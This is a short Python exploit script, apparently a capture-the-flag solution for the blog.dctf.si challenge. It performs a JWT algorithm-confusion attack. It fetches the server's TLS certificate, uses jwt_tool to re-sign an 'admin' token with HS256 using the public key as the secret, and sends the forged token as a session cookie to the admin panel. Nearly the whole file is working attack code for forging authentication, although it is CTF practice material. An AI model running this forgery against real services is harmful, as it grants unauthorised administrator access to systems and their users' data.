import requests
import jwt, os
from cryptography import x509
import subprocess
import base64
import json


domain = "blog.dctf.si"
url = f"https://{domain}:443"

def get_pubkey(out_file):
    os.system(f"timeout 6s openssl s_client -connect {domain}:443 2>/dev/null | openssl x509 > {out_file}")
    pass

pk_file = f"./{domain}.cert.pem" # You get this from the ssl cert
get_pubkey(pk_file)
jwt_tool_dir = "/opt/jwt_tool"


def ser(d):
    return base64.b64encode(json.dumps(d).encode('utf-8')).decode('utf-8')


header = ser({
    "typ": "JWT",
    "alg": "HS256"
})
payload = ser({
    "user": "admin"
})

# Bogus token signature, payload and header are normal
token = f"{header}.{payload}.Oetm7xvhkYbiItRiqNx-z7LZ6ZkmDe1z_95igbPUSjA"

argv = [f"{jwt_tool_dir}/jwt_tool.py",
        "-pk", pk_file,
        "-X", "k",  # Confusion attack
        "-np",  # Don't use proxy
        "-S", "hs256",
        "-b",  # raw output
        token
        ]
print(*argv)
p = subprocess.Popen(argv, stdout=subprocess.PIPE)
generated = p.communicate()[0].decode("utf-8").strip()
print(generated)
r = requests.get(f"{url}/admin_panel", cookies={"session": generated}, verify=False)
print(r)
print(r.history)
print(r.text)
